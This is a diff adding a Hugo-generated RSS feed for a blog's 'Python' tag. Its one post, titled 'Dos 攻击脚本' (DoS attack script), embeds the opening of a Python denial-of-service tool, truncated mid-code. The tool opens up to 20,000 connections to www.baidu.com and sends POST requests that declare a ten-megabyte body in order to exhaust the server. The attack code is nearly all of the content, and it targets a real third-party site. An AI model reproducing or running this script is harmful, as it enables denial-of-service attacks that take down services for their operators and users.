@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Python on My Site</title>
+    <link>http://example.com/tags/python/</link>
+    <description>Recent content in Python on My Site</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 08 Apr 2020 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="http://example.com/tags/python/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Dos 攻击脚本</title>
+      <link>http://example.com/posts/dos-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</link>
+      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://example.com/posts/dos-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</guid>
+      <description>#!/usr/bin/env python import socket import time import threading # Pressure Test,ddos tool # --------------------------- MAX_CONN = 20000 PORT = 80 HOST = &amp;#34;www.baidu.com&amp;#34; PAGE = &amp;#34;/index.php&amp;#34; # --------------------------- buf = (&amp;#34;POST %sHTTP/1.1\r\n&amp;#34; &amp;#34;Host: %s\r\n&amp;#34; &amp;#34;Content-Length: 10000000\r\n&amp;#34; &amp;#34;Cookie: dklkt_dos_test\r\n&amp;#34; &amp;#34;\r\n&amp;#34; % (PAGE, HOST)) socks = [] def conn_thread(): global socks for i in range(0, MAX_CONN): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((HOST, PORT)) s.send(buf.encode()) print(&amp;#34;Send buf OK!,conn=%d\n&amp;#34; % i) socks.append(s) except Exception as ex: print(&amp;#34;Could not connect to server or send error:%s&amp;#34; % ex) time.</description>
+    </item>
+    
+  </channel>
+</rss>
